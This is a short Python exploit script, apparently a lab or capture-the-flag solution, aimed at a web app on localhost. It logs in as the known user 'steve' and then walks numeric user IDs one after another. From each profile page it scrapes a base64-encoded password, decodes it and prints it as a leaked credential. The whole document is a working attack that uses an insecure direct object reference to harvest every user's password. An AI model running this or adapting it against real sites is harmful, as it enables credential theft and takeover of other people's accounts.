from base64 import b64decode
import re
import requests

passwd_re = re.compile(r"<p><b>Password</b>: (?P<password>.*)</p>")

HOST = "http://localhost:8888"

# known user
username = "steve"
password = "password"

s = requests.Session()

# Login as normal user
s.post(HOST + "/login", data={"username": username,
       "password": password}, allow_redirects=False)

# Leak all users password
i = 0
resp = s.get(HOST + f"/{i}")
while resp.status_code == 200:
  mo = passwd_re.search(resp.text)
  if mo:
    print(
        f"Leak user password with id {i}: {b64decode(mo.group('password')).decode()}")
  i += 1
  resp = s.get(HOST + f"/{i}")
